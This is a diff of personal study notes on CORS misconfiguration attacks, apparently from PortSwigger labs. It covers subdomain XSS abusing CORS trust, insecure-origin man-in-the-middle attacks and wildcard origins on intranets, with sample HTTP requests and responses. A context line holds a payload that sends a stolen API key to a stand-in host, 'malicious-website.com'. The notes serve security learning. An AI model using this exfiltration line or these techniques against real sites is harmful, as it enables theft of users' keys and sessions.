@@ -60,4 +60,43 @@ location='malicious-website.com/log?key='+this.responseText;
 TODO: finish the lab, portswigger appears to be broken
 
 # Exploiting XSS via CORS trust relationships
-#to-be-continued 
+If you find a vulnerability on subdomain, you probable being able to make request to main domain website to retrieve sensetive information.
+Example:
+```http
+GET /api/requestApiKey HTTP/1.1
+Host: vulnerable-website.com
+Origin: https://subdomain.vulnerable-website.com
+Cookie: sessionid=...
+```
+If the server responds with:
+```http
+HTTP/1.1 200 OK
+Access-Control-Allow-Origin: https://subdomain.vulnerable-website.com
+Access-Control-Allow-Credentials: true
+```
+Then an attacker who finds an XSS on subdomain could retrieve the API key:
+```
+https://subdomain.vulnerable-website.com/?xss=<script>cors-stuff-here</script>
+```
+
+# Breaking TLS with poorly configured CORS
+Try to specify non-secure trusted subdomain as Origin:
+```http
+GET /api/requestApiKey HTTP/1.1
+Host: vulnerable-website.com
+Origin: http://trusted-subdomain.vulnerable-website.com
+Cookie: sessionid=...
+```
+If the application responds with:
+```http
+HTTP/1.1 200 OK
+Access-Control-Allow-Origin: http://trusted-subdomain.vulnerable-website.com
+Access-Control-Allow-Credentials: true
+```
+It's possible to exploit MITM attack.
+# Intranets and CORS without credentials
+Internal networks are usually less secure:
+```http
+Access-Control-Allow-Origin: *
+```
+and might not use credentials at all.
